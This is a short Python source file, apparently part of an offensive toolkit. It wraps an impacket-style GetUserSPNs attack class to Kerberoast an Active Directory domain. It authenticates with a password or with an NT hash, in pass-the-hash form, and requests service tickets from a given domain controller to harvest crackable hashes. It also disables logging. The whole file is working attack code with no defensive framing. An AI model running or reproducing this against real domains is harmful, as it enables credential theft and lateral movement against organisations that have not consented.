from pympacket.attacks.GetUserSPNs import GetUserSPNs
from argparse import Namespace
import logging
import sys

def kerberoast(username, domain, dc_ip, password='', nthash=None):
    # This script is meant to be executed against the current domain, for now
    user_domain = domain
    target_domain = domain

    if nthash is not None:
        nthash = f'aad3c435b514a4eeaad3b935b51304fe:{nthash}'

    logging.disable(sys.maxsize) #Disable impacket logger
    cmdLineOptions = Namespace(
        no_preauth=None,
        outputfile=None,
        usersfile=None,
        aesKey=None,
        k=False,
        request=True,
        dc_ip=dc_ip,
        dc_host=None,
        save=False,
        request_user=None,
        stealth=False,
        hashes=nthash
    )

    krbroasting = GetUserSPNs(username, password, user_domain, target_domain, cmdLineOptions=cmdLineOptions)
    return krbroasting.run()
